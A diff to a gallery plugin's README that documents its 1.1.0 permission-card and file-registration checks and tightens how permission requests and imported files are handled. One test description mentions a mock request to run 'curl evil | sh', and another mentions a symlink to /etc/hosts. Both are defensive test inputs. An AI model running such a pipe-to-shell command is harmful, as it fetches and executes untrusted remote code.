@@ -62,6 +62,19 @@ Chromium for its screenshot checks.
 - The bundled skill: checked by resolving the skill with `HOME` pointed at an empty directory (the
   gallery picked the bundled copy for prompts and examples) and by building
   `examples/dial-indicator` from a copy of the bundled skill.
+- Permission cards and cancelling (1.1.0), exercised in the page against a mock Agent with the same
+  `run` / `reply` contract: two requests in one run (the second `curl evil | sh`) each waited for a
+  click, with no reply sent until then (the second waited five minutes); Allow sent `allowOnce`,
+  Deny sent `deny`; a request already settled on MCode's card in the side panel is removed with a
+  notice when its gallery card is clicked, and logged as handled there; the old `/auto-allow` route
+  returns 404 and an `autoAllow` field in the request body has no effect; cancelling a run that
+  waits on a request aborts it and clears the card.
+- Registration checks (1.1.0), exercised against `addVersion`: real PNG, JPEG and WebP screenshots
+  and a symlink to an anatomy page are accepted; a `.png` symlinked to a text file, a `.png` whose
+  content is text, an `.html` symlinked to `/etc/hosts`, a directory, a missing file and a relative
+  path are rejected, and nothing from the rejected files reaches `dataDir`.
+- Not yet verified: permission cards in a real Agent run, answering an Agent question in the side
+  panel, the pop-out window, and creating a first figure on a machine without anatomy installed.
 
 ## Data & access
 
@@ -79,9 +92,14 @@ Chromium for its screenshot checks.
     package. It reads the skill's examples and preview images to show them, and passes the skill
     directory to the Agent.
   - Pages registered by the Agent or imported by you: the absolute HTML paths (and screenshots)
-    given to `register_figure_version` or typed into Import, plus a sibling `-light.html`. Pages must
-    carry anatomy's `class="iso"` marker. The gallery copies them into `dataDir` and never writes to
-    the originals.
+    given to `register_figure_version` or typed into Import, plus a sibling `-light.html`. Any
+    folder is accepted, because the Agent decides where it saves screenshots and the skill's own
+    example screenshots live in another folder. Each path is resolved with `realpath` first and all
+    checks apply to the real file: it must be a regular file; a page must have an `.html`/`.htm`
+    name, be at most 30 MB and carry anatomy's `class="iso"` marker; a screenshot must have a PNG,
+    JPEG or WebP name, be at most 15 MB, and its file header must be a real PNG, JPEG or WebP (the
+    stored type comes from the header). The gallery copies accepted files into `dataDir` and never
+    writes to the originals.
 - **Files written outside `dataDir`**: none by the gallery itself. The Agent writes the figure's
   source in the working directory the Host assigns to the gallery's sessions (see Agent turns).
 - **Agent turns** (`agentAccess: ["session.run"]`): each figure gets one hidden session created with
@@ -93,9 +111,11 @@ Chromium for its screenshot checks.
   what `register_figure_version` receives, after validating it. Agent output language follows the
   language of your request.
 - **Permissions**: every permission request in a gallery run is shown as a card with Allow, Deny
-  and "本次运行都允许" (allow for this run). Nothing is allowed unless you click. If you choose
-  "allow for this run", later requests in the same run are answered with `allowOnce` on your behalf
-  until the run ends; the next run asks again. Agent questions are answered in the chat side panel.
+  and "去对话里批准" (approve in the conversation). The gallery never answers a request on its own:
+  Allow and Deny relay your click for that one request, and nothing happens until you click.
+  "去对话里批准" opens the figure's session in the chat side panel, where MCode's own permission
+  card and permission-mode switch decide; options such as allowing everything for that
+  conversation are MCode's, not the gallery's. Agent questions are answered in the chat side panel.
 - **MCP**: the package declares an MCP server served by the Mini App itself at
   `/mcp/anatomy-gallery`, with `register_figure_version` and `list_figures`. Agents can call them
   while the gallery runs, including from ordinary chats.
